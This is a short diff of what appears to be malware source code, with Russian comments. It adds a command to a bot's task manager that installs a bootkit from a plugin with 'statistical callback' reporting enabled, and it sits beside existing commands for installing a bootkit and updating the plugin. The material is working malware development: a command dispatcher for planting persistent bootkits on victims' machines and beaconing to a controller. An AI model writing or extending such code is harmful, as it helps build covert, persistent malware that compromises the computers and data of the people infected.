@@ -944,6 +944,9 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 	// Команда установки Bootkit из плага
 	RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBk, Plugin::ExecuteInstallBk);
 
+	// Команда установки Bootkit из плага c включением статистического отстука
+	RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBkStat, Plugin::ExecuteInstallBkStat);
+
 	// Команда обновления плага
 	RegisterCommand(Manager, (PCHAR)Plugin::CommandUpdatePlug, Plugin::ExecuteUpdatePlug);
 
